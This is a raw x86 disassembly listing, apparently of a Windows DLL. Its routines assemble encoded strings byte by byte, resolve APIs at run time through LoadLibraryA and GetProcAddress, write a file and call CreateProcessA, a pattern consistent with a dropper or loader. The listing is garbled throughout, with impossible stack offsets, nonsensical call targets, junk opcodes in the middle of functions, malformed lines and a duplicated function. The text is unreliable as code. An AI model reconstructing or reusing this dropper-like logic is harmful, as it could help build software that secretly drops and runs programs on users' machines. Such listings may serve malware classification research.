mov [ ebp - 0x90 ] 0x2d
mov [ ebp - 0x8d ] 0x1a
les eax [ ebp - 0x8e ]
push ss
mov [ ebp - 0x2000008d ] 0x1b
mov [ ebp - 0x8c ] 0x3d
mov [ ebp - 0x8b ] 0x16
mov [ ebp - 0x2000008a ] 0x13
mov [ ebp - 0x89 ] 0x1a
mov [ ebp - 0x88 ] bl
mov [ ebp - 0x50 ] 0x36
mov [ ebp - 0x4f ] 0x11
mov [ ebp - 0x4e ] 0xb
mov [ ebp - 0x4d ] 0x1a
mov [ ebp - 0x4c ] 0xd
mov [ ebp - 0x4b ] 0x11
mov [ ebp - 0x4a ] 0x1a
mov [ ebp - 0x49 ] 0xb
mov [ ebp - 0x48 ] 0x2c
mov [ ebp - 0x47 ] 0x1b
mov [ ebp - 0x46 ] 0xb
mov [ ebp - 0x45 ] 0x30
mov [ ebp - 0x44 ] 0xd
mov [ ebp - 0x43 ] 0xb
mov [ ebp - 0x42 ] 0x16
mov [ ebp - 0x41 ] 0x10
mov [ ebp - 0x40 ] 0x11
mov [ ebp - 0x3f ] 0x3e
mov [ ebp - 0x3e ] bl
mov [ ecx - 0x4 ] ebx
lea eax [ ebp - 0x20084 ]
push edx
call sub_100075ee
pop ecx
lea eax [ ebp - 0x84 ]
push eax
call [ r-xdata ]
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x1c ] ebx
stosd [ edi ]
or esp [ edx + 0x3 ]
dec eax
retn
lea edx [ ebp - 0x1c0 ]
push eax
call 0x500075ee
lea eax [ ebp - 0x3c ]
push eax
call sub_100075ee
lea eax [ ebp - 0xac ]
push eax
call 0xffffffff900075ee
lea eax [ ebp - 0x64 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x2c ]
push eax
call 0x102075ee
lea eax [ ebp - 0x78 ]
push eax
call sub_100075ee
lea eax [ ecx - 0x98 ]
push eax
call sub_100075ee
test [ ebp - 0x60 ] eax
push eax
call sub_100075ee
add esp 0x20
lea eax [ ebp - 0xc0 ]
push eax
out dx eax
xor eax rw-data
mov esi [ 0xe11c ]
call esi
cmpsd [ esi ] [ edi ]
jo r-xdata
xor eax rw-data
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0xac ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x64 ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x2c ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x77 ]
push eax
push [ rw-data ]
inc esi
mov [ 0x10410780 ] eax
lea eax [ ebp - 0x98 ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x50 ]
push eax
push [ rw-data ]
call esi
mov [ r--data ] eax
cmp [ rw-data ] ebx
je r-xdata
add [ eax ] edx
lea eax [ ebp - 0x3c ]
push eax
push [ rw-data ]
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
sub eax 0x27781d39
add [ eax ] edx
je r-xdata
cmp [ r--data ] ebx
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
cmp [ rw-data ] ebx
hlt
sub_10003417
push ebp
mov ebp esp
push 0xffffffff
push r--data
dec eax
add dh al
add [ eax ] dl
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x16 ] esp
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp + 0x10 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
call sub_1000345e
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp eax ebx
sub_10003465
xor cl [ ecx - 0xafbffa ]
adc eax malloc@IAT
jns r-xdata
and [ ebp - 0x5c ] 0x40
or [ ebp - 0x10 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp + 0x70 ]
ror [ fs : 0x0 ] 0x5f
pop esi
pop ebx
leave
retn
jge r-xdata
inc ecx
push ecx
push ebx
push edx
call sub_1000d316
push [ esi ]
std
jne r-xdata
mov [ edi ] eax
cmp edi ebx
jne r-xdata
fbstp [ edi ]
call 0x1010d31c
add esp 0x18
mov ecx [ esi ]
mov [ esi ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_100034a7
jmp sub_100034c9
sub_100034e0
in al dx
push 0xffffffff
push r--data
inc eax
add dh al
add [ eax ] dl
mov eax [ fs : 0x8 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
mov [ esp - 0x77 ] edi
jge sub_100034e0
mov [ ebp - 0x4 ] ebx
mov [ ebp + 0x50 ] 0x5
push edi
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x23000005
push [ ebp + 0x8 ]
call [ rw-data ]
mov eax [ ebp - 0x1c ]
cmp eax edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
push eax
call [ ecx ]
shl cl 0x0
adc [ ecx - 0x75 ] bl
jne r-xdata
retn 0x9d
mov [ esi ] eax
cmp eax edi
je r-xdata
push [ ebp - 0x1c ]
push edi
push eax
call sub_1000d316
add esp 0xc
lea ecx [ ebp - 0x2c ]
push ecx
sub eax edi
push eax
mov eax [ esi ]
add eax edi
push eax
push [ ebp + 0x8 ]
call [ ebp + 0x10110784 ]
cmp eax 0x1
jne r-xdata
add edi [ ebp - 0x2c ]
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov eax [ ebp - 0x1b ]
cmp edi eax
jae r-xdata
sub_1000359e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push 0x1
pop eax
mov [ ebp - 0x20 ] eax
xor ebx ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] 0x17
mov [ ebp - 0x2f ] 0xb
mov [ ebp - 0x2e ] 0xb
mov [ ebp - 0x2d ] 0xd
mov [ ebp - 0x2c ] 0x45
mov [ ebp - 0x2b ] 0x50
mov [ ebp - 0x2a ] 0x50
mov [ ebp - 0x29 ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] ecx
pop [ ebp + 0xc ]
lea esi [ eax + 0x1 ]
push esi
stosd [ edi ]
cmp eax malloc@IAT
call edi
pop ecx
mov [ ebp - 0x1c ] eax
aas
retn
sub_10003723
xor ebx ebx
cmp [ ebp - 0x34 ] ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
push [ ebp - 0x34 ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x34 ] ebx
retn
push [ ebp - 0x24 ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x24 ] ebx
sub_1000376d
push ebp
mov ebp ebp
push 0xffffffff
push 0x1010e2a8
push sub_1000c600
mov eax [ fs : 0x2 ]
push eax
mov [ fs : 0x0 ] esp
sub eax 0x4c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ecx - 0x2c ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x4 ] esi
push 0x1
pop ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x44 ] esi
jae r-xdata
or al 0xc7
inc ebp
shl [ eax - 0x1600001c ] 0x1
hlt
and al 0x1
add [ eax ] edx
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push [ ebp + 0xc ]
call 0x1080420e
and esp 0x14
push esi
push esi
push 0x3
mov eax rw-data
push eax
push eax
push 0x52
sub_1000392d
cmp [ ebp - 0x1c ] esi
je r-xdata
mov edi [ r--data ]
cmp [ ebp - 0x2c ] esi
je r-xdata
push [ ebp - 0x1c ]
mov edi [ free@IAT ]
call edi
sbb ecx ecx
jne r-xdata
cmp [ ebp - 0x28 ] esi
je r-xdata
push [ ebp - 0x2c ]
call edi
pop ecx
mov [ ebp - 0x2c ] esi
add al 0x0
add [ eax ] al
jmp sub_100039a6
jmp 0xffffffffd83dc44c
cmp [ ebp - 0x24 ] edx
je r-xdata
push [ ebp - 0x28 ]
call edi
pop ecx
mov [ ebp - 0x28 ] esi
cmp [ ebp - 0x32 ] esi
je r-xdata
push [ ebp - 0x24 ]
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ ebp - 0x34 ]
call [ rw-data ]
mov [ ebp - 0x34 ] esi
retn
std
jne r-xdata
fdiv st6
xlat
pop ecx
mov [ ebp - 0x24 ] esi
call [ rw-data ]
mov [ ebp - 0x1c ] esi
sub_10003b1e
dec ebp
adc [ ecx + 0x74c98501 ] cl
xor bh bh
aaa
push esi
push eax
call sub_1000d316
mov al [ ebp + 0xc ]
lea ebx [ eax - 0x26 ]
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x34 ] 0xc
add ebx 0xc
mov [ ebp - 0x28 ] ebx
push ebx
call [ 0x1100e1c0 ]
add esp 0x10
mov esi eax
or [ ebp - 0xc ] edx
test esi esi
jne r-xdata
push ebx
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
add [ ebp - 0x20 ] ah
add [ edi - 0x17ff039b ] al
pushad
add [ eax ] al
add bl ch
jl r-xdata
mov ecx [ 0xffffffffeb018918 ]
0x85e4758b 0xf4f6
or al 0x56
call [ free@IAT ]
pop ecx
and [ ebp - 0x1c ] 0x0
retn
push 0x0
push esi
call sub_1000d316
mov [ ebp - 0x3c ] esi
mov [ esi ] 0x40
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
add [ edi ] 0xffffff89
inc esi
or [ eax - 0x72fffe9a ] al
inc ebx
hlt
sub_10003bee
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x400 ] ecx
pop edi
pop esi
pop edi
leave
adc [ ebp - 0x75 ] 0xffffffec
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x290
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x13c ] bl
cdq
pop ebp
loopne r-xdata
add eax 0x56000001
push ebx
lea eax [ ebp - 0x108 ]
push eax
call 0x1400d316
push esi
push ebx
lea eax [ ebp - 0x248 ]
push eax
call 0x1040d316
add esp 0x18
inc esi
sub_10003c04
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x290
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x13c ] bl
cdq
pop ebp
loopne r-xdata
add eax 0x56000001
push ebx
lea eax [ ebp - 0x108 ]
push eax
call 0x1400d316
push esi
push ebx
lea eax [ ebp - 0x248 ]
push eax
call 0x1040d316
add esp 0x18
inc esi
sub_10003df2
add [ eax + eax ] ah
add [ ecx - 0x2df63 ] cl
call [ ebx - 0x73 ]
test [ eax - 0x3 ] esp
jg r-xdata
call [ eax - 0x1 ]
jne r-xdata
push eax
push [ ebp + 0xc ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x20 ]
call [ WriteFile@IAT ]
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
mov ebx [ ebp - 0x20 ]
push 0x44
pop esi
push esi
push ebx
lea eax [ ebp - 0x28c ]
push eax
call 0x1004d316
add esp 0x2c
mov [ ebp - 0x28c ] esi
mov [ ebp - 0x200278 ] ebx
mov [ ebp - 0x10260 ] 0x81
mov [ ebp - 0x25c ] bx
lea eax [ ebp - 0x29c ]
push eax
lea eax [ ebp - 0x28c ]
push eax
lea eax [ ebp - 0x40248 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x128 ]
push eax
[ CreateProcessA@IAT ]
test eax eax
jne r-xdata
push 0x7d0
call [ 0x1040e124 ]
mov [ ebp - 0x13c ] 0x1
mov [ ebp - 0x4 ] ebx
test al 0x4
add [ eax ] al
add bl ch
sbb [ ebx ] dh
sub_10003edb
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
inc esp
mov [ 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x2c ] esi
xor [ ebp - 0x24 ] 0x89e47589
jne r-xdata
push 0x1
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x34 ] esi
push eax
push rw-data
mov [ ebp - 0x34 ] eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov edi 0xdae80c75
adc al [ eax ]
and [ ecx + 0x7789dc71 ] cl
shr [ edi + 0x75 ] 0x1
push ss
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_10004059
add esp 0x2c
movzx eax dl
mov [ ebp - 0x3c ] eax
cmp eax esi
jne r-xdata
push esi
push esi
push 0x3
mov eax 0x11010764
push eax
push eax
push 0x50
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov [ ebp - 0x20 ] eax
cmp eax esi
or eax edi
inc ebp
fcomp [ ecx - 0x1400001c ]
dec edi
push esi
push 0x4000000
push esi
salc
push rw-data
push [ ebp - 0x24 ]
push r--data
jo r-xdata
mov [ ebp - 0x28 ] 0xffffe49b
jecxz r-xdata
call [ rw-data ]
leave
inc ebp
aam 0x3b
adc eax rw-data
sub_10003fec
cmp [ ebp - 0x24 ] esi
je r-xdata
cmp [ ebp - 0x20 ] esi
je r-xdata
mov edi 0x15ffdc75
enter 0xe1 0x10
pop ecx
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ ebp - 0x1c ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x1c ] esi
cmp [ ebp - 0x2c ] esi
je r-xdata
push [ ebp - 0x10 ]
call [ rw-data ]
mov [ ebp - 0x20 ] esi
retn
push [ ebp - 0x2c ]
call [ 0x10030780 ]
mov [ ebp - 0x2c ] esi
sub_10004059
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x200 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x40
rcl [ esi + 0x57 ] cl
leave
call 0x11e48649
mov [ ebp - 0x38 ] 0x5a
mov [ ebp - 0x27 ] 0x5a
and [ ebp - 0x26 ] 0x8
mov [ ebp - 0x3c ] 0xc765c65a
dec edi
retn 0xc645
sub_100040f1
lea eax [ eax + esi ]
mov edi [ ebp + 0xc ]
mov [ ebx ] eax
inc eax
push eax
inc [ malloc@IAT ]
add esp 0x18
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
test esi esi
jne r-xdata
add [ eax ] al
push 0x11
push 0x0
call [ GetLastError@IAT ]
mov [ ebp + 0x18 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x3c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x8000 ] ebp
pop edi
pop esi
pop ebx
leave
retn
sub_100041e6
push ebp
mov ebp esp
push ecx
call sub_100041c8
mov [ ebp - 0x2 ] eax
fild [ ebp - 0x4 ]
fadd [ r--data ]
fmul [ r--data ]
sbb [ eax ] eax
adc [ ecx ] al
add [ edi ] ecx
add [ esi ] dl
add [ eax ] al
add [ edx ] al
pop ss
sub_1000420e
add [ eax ] al
add [ 0x2000000 ] al
add [ eax ] al
inc eax
into
and [ edx + ecx * 2 ] 0x0
add [ eax ] al
add [ ecx + ebp * 2 ] al
add [ ecx + ecx * 4 + 0x25 ] ah
add [ eax ] al
add [ eax ] al
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x411
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x28 ]
cmp edi 0x75ff5a74
adc al 0x57
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
add eax 0x2b4734c0
sub_1000425b
mov [ ebp - 0x2c ] eax
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov eax [ esp + edx * 8 - 0x77 ]
inc ebp
fcom [ edi - 0x18 ]
loop r-xdata
push [ ebp + 0x4 ]
call sub_1000c360
pop ecx
add eax [ ebp - 0x2c ]
jmp r-xdata
add dl [ edi ]
add [ ecx ] al
mov esi eax
sub esi [ ebp - 0x24 ]
mov [ ebp - 0x1f ] esi
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
lea eax [ esi + 0x1 ]
push eax
call [ 0x5000e1c0 ]
pop ecx
pop ecx
mov ebx [ ebp + 0xc ]
mov [ ebx ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] eax
push edi
call 0x1100d360
lea ecx [ esi + 0x1 ]
push ecx
push 0x0
push ecx
call sub_1000d316
push esi
mov eax [ ebp - 0x24 ]
add eax edi
push eax
sti
xor edi ebx
adc eax strncpy@IAT
add [ eax + ebx * 4 - 0x75 ] 0x45
aam 0x80
and al 0x38
add bl ch
or ebp [ edx + 0x1 ]
pop eax
retn
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
fld st3
sub_100042f0
push ebp
mov ebp esp
sub esp 0x208
push ecx
push esi
mov eax 0xff
mov esi 0x1040100
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
push esi
lea eax [ ebp - 0x204 ]
push 0x0
push eax
xor bl bl
call sub_1000d316
push esi
lea eax [ ebp - 0x1000108 ]
push 0x0
inc eax
call sub_1000d316
add esp 0x18
call sub_10006e05
test eax eax
jne r-xdata
call sub_1000821e
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x100108 ]
push eax
mov al 0x1
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_100043ac
push esi
xor esi esi
push esi
push esi
push 0x2f
push esi
call [ rw-data ]
push esi
push esi
push 0x25
push esi
call [ rw-data ]
push 0x3e8
call [ CreateThread@IAT ]
pop esi
retn
sub_100043d2
push esp
or ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x4000000 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi 0x5000
mov [ ebp - 0x4c ] esi
xor ebx ebx
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x290 ] ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x8c ] ebx
dec ecx
popfd
xor bh bh
sub_10004439
inc esi
test [ edi + edi * 8 ] esi
jg r-xdata
dec [ edi - 0x3a ]
test [ 0x4effffff ] esi
mov [ ebp - 0xca ] 0x4f
mov [ ebp - 0xc9 ] 0x4f
mov [ ebp - 0xc8 ] 0x4f
mov [ ebp - 0x10c7 ] 0x4f
mov [ ebp - 0xc6 ] 0x4f
mov [ ebp - 0xc5 ] 0x4f
mov [ ebp - 0x400c4 ] 0x5a
mov [ ebp - 0xc3 ] 0x5a
mov [ ebp - 0xc2 ] bl
mov [ ebp - 0x88 ] 0x4f
mov [ ebp - 0x87 ] 0x4f
mov [ ebp - 0x86 ] 0x4f
mov [ ebp - 0x85 ] 0x4f
mov [ ebp - 0x84 ] 0x4f
mov [ ebp - 0x83 ] 0x4f
mov [ ebp - 0x81 ] 0x4f
mov [ ebp - 0x4000081 ] 0x4f
mov [ ebp - 0x80 ] 0x5a
mov [ ebp - 0x7f ] 0x5a
mov ch bl
add dh 0x45
sub [ esi + eax * 8 ] 0x45
test [ eax ] esi
mov [ ebp - 0x7a ] 0x39
mov [ ebp - 0x79 ] 0x2b
mov [ ebp - 0x78 ] 0x28
mov [ ebp - 0x77 ] 0x3e
mov [ ebp - 0x76 ] 0x2d
mov [ ebp - 0x75 ] 0x3a
mov [ ebp - 0x64 ] 0x23
mov [ ebp - 0x73 ] 0x32
mov [ ebp - 0x72 ] 0x16
retn 0x8f45
dec edi
mov [ ebp - 0xcb ] 0x4e
sub_100044f8
sbb al 0xc6
inc ebp
nop
or eax 0x109145c6
mov [ ebp - 0x6e ] 0xc
mov [ ebp - 0x6d ] 0x50
mov [ ebp - 0x4c ] 0x19
mov [ ebp - 0x6b ] 0xb
mov [ ebp - 0x6a ] 0x23
mov [ ebp - 0x6a ] 0x28
mov [ ebp - 0x68 ] 0x16
mov [ ebp - 0x67 ] 0x11
mov [ ebp - 0x66 ] 0x1b
mov [ ebp - 0x65 ] 0x10
mov [ ebp - 0x64 ] 0x8
mov [ ebp - 0x63 ] 0xc
mov [ ebp - 0x62 ] 0x5f
mov [ ebp - 0x61 ] 0x35
mov [ ebp - 0x20 ] 0x2b
mov [ ebp - 0x5f ] 0x23
mov [ ebp - 0x5e ] 0xbc
mov [ ebp - 0x5d ] 0xa
mov [ ebp - 0x5c ] 0xd
mov [ ebp - 0x5b ] 0xd
mov [ ebp - 0x5a ] 0x1a
mov [ ebp - 0x59 ] 0x11
mov [ ebp - 0x58 ] 0xb
mov [ ebp - 0x57 ] 0x29
mov [ ebp - 0x56 ] 0x1a
mov [ ebp - 0x55 ] 0xd
mov [ ebp - 0x54 ] 0xc
mov [ ebp - 0x53 ] 0x16
mov [ ebp - 0x52 ] 0x10
mov [ ebp - 0x51 ] 0x11
mov [ ebp - 0x50 ] 0x23
mov [ ebp - 0x4f ] bl
mov [ ebp - 0x44 ] 0x2c
mov [ ebp - 0x43 ] 0x30
mov [ ebp - 0x42 ] 0x39
mov [ ebp - 0x41 ] 0x2b
mov [ ebp - 0x40 ] 0x28
mov [ ebp - 0x3f ] 0x3e
mov [ ebp - 0x3e ] 0x2d
mov [ ebp - 0x3d ] 0x3e
mov [ ebp - 0x3c ] 0x2b
mov [ ebp - 0x3b ] 0x32
mov [ ebp - 0x3a ] 0x16
mov [ ebp - 0x39 ] 0x1c
mov [ ebp - 0x38 ] 0xd
mov [ ebp - 0x37 ] 0x10
mov [ ebp - 0x36 ] 0xc
mov [ ebx + ecx * 8 + 0x10 ] 0xc6
inc ebp
int3
sub_10004cc1
cmp [ ebp - 0x90 ] ebx
je r-xdata
cmp edi ebx
je r-xdata
mov esi [ free@IAT ]
push edi
mov esi [ free@IAT ]
call esi
pop ecx
mov [ ebp - 0xd4 ] ebx
jmp r-xdata
cmp [ ebp - 0x8c ] ebx
je r-xdata
push [ ebp - 0x94 ]
call esi
pop ecx
mov [ ebp - 0x94 ] ebx
cmp [ ebp - 0x494 ] ebx
je r-xdata
cmp [ ebp - 0xd0 ] ebx
je r-xdata
push [ ebp - 0x89 ]
call [ esi + 0x59 ]
mov [ ebp - 0x8c ] ebx
retn
push [ ebp - 0x50 ]
call esi
pop ecx
mov [ ebp - 0xd0 ] ebx
sub_10004f21
cmp eax esi
test [ edi * 8 - 0x39b20001 ] edi
test [ 0x4efffffd ] edi
mov [ ebp - 0x2c2 ] 0x4f
mov [ ebp - 0x2c1 ] 0x46
mov [ ebp - 0x2c0 ] 0x2
mov [ ebp - 0x1002bf ] bl
mov [ ebp - 0x64 ] 0x2c
mov [ ebp - 0x63 ] 0x30
mov [ ebp - 0x62 ] 0x31
mov [ ebp - 0x61 ] 0x2b
mov ch 0xa0
sub dh al
inc ebp
cmp [ esi ] 0x2da245c6
retn 0xa345
sub_10004f6a
cmp al dh
inc ebp
movsb [ edi ] [ esi ]
and eax esi
inc ebp
mov ch 0x3c
mov [ ebp - 0x5a ] 0x13
mov [ ebp - 0x59 ] 0x1e
mov [ ebp - 0x54 ] 0xc
mov [ ebp - 0x57 ] 0xc
mov [ ebp - 0x56 ] 0x1a
mov [ ebp - 0x55 ] 0xc
mov [ ebp - 0x54 ] 0x23
mov [ edi - 0x53 ] 0x3c
mov [ ebp - 0x52 ] 0x33
mov [ ebp - 0x51 ] 0x2c
mov [ ebp - 0x50 ] 0x36
mov [ ebp - 0x4f ] 0x3b
mov [ ebp - 0x4e ] 0x23
mov [ ebp - 0x4d ] 0xc
mov [ ebp - 0x4c ] 0x48
mov [ ebp - 0x4b ] 0x48
mov [ ebp - 0x4a ] 0x4f
mov [ ebp - 0x49 ] 0x4c
mov [ ebp - 0x48 ] 0x4d
mov [ ebp - 0x47 ] 0x2b
mov [ ebp - 0x46 ] 0x3c
mov [ ecx - 0x45 ] 0x3e
mov [ ebp - 0x44 ] 0x52
mov [ ebp - 0x43 ] 0x3d
mov [ ebp - 0x42 ] 0x48
mov [ ebp - 0x41 ] 0x39
mov [ ebp - 0x40 ] 0x4d
into
inc ebp
rcl [ edx - 0x3a ] 0x45
retn 0xc64e
sub_10006186
adc esi eax
inc ebp
xchg ebp eax
sbb esi eax
inc ebp
xchg esi eax
adc [ eax ] ah
pop ecx
xlat
mov [ ebp - 0x60 ] 0x5a
mov [ 0x45c64fa1 ] 0xa2
dec ecx
mov [ ebp - 0x5d ] 0x7
mov [ ebp - 0x5c ] 0x5a
mov [ ebp - 0x5b ] 0x4f
mov [ ebp - 0x7a ] 0x4d
mov [ ebp - 0x59 ] 0x7
mov [ ebp - 0x58 ] 0x5a
mov [ ebp - 0x57 ] 0x4f
mov [ ebp - 0x56 ] 0x4d
mov [ ebp - 0x55 ] 0x7
mov [ ebp - 0x54 ] 0x5a
mov [ ebp - 0x53 ] 0x4f
mov [ ebp - 0x52 ] 0x4d
mov [ ebp - 0x51 ] 0x7
mov [ ebp - 0x50 ] 0x5a
mov [ ebp - 0x4f ] 0x4f
les eax [ ebp - 0x4e ]
int 0xc6
inc ebp
mov bl 0x7
mov [ ebp - 0x4c ] 0xb545c65a
dec edi
mov [ ebp - 0x4a ] 0x4d
mov [ ebp - 0x49 ] 0x7
mov [ ebp - 0x48 ] 0x5a
les eax [ ebp - 0x47 ]
dec edi
mov [ ebp - 0x46 ] 0x4d
mov [ ebp - 0x45 ] 0x7
mov [ ebp - 0x44 ] 0x5a
mov [ ebp - 0x43 ] 0x4f
mov [ ebp - 0x42 ] 0x4d
mov [ ebp - 0x41 ] 0x7
and [ ebp - 0x40 ] bl
mov [ ebp - 0x38 ] 0x5a
mov [ ebp - 0x37 ] 0x4f
mov [ ebp - 0x36 ] 0x47
mov [ ebp - 0x35 ] 0x3
mov [ ebp - 0x34 ] 0x45
mov [ ebp - 0x33 ] 0x45
and [ ebp - 0x32 ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call sub_100075ee
lea edx [ ebp - 0x78 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x60 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x38 ]
push eax
call sub_100075ee
add esp 0x10
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ ebp - 0x64 ] ebx
lea eax [ ebp - 0x28 ]
push eax
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x3c ] eax
cmp eax ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x64 ]
mov ecx [ edi - 0x10 ]
cdq
or eax 0x0
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0x78 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
mov edi eax
mov ebp edi
cmp [ ebx ] 0xfb
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push ebx
call [ edi - 0x77 ]
inc ebp
cwde
cmp eax 0x6f
jne r-xdata
cmp eax ebx
je r-xdata
div [ ebp - 0x7c ]
call [ malloc@IAT ]
pop ecx
mov esi eax
mov [ ebp - 0x2c ] dh
cmp esi ebx
je r-xdata
add [ ebp - 0x3 ] ebx
call sub_10006501
jmp r-xdata
mov [ ebp - 0x30 ] esi
or eax 0x56508445
call edi
mov [ ebp - 0x68 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x8c ] ebx
mov edi [ lstrlenA@IAT ]
cmp esi ebx
mov ebx [ ebp + 0xc ]
je r-xdata
push [ ebp + 0x8 ]
call strlen
sub ebx eax
push ebx
push rw-data
push [ ebp + 0x8 ]
call [ 0xffffffff9000e9cc ]
add esp 0x10
xor ebx ebx
jmp r-xdata
cmp [ 0xfffffffffffaff5c ] ebx
ja r-xdata
push [ edi + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
mov ecx [ esi + 0x190 ]
mov [ ebp - 0x10040190 ] ecx
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx ebx
sub ecx eax
push ecx
mov ecx [ eax + ecx + 0x3 ]
retn
sub_10006441
inc [ ebp - 0x74708b40 ]
inc ebp
or al 0x2b
test [ edi + edi * 8 - 0x1 ] edi
call [ eax + 0x68 ]
add [ ecx ] eax
adc bh bh
jne r-xdata
or al 0x90
and eax [ eax - 0x1 ]
jne r-xdata
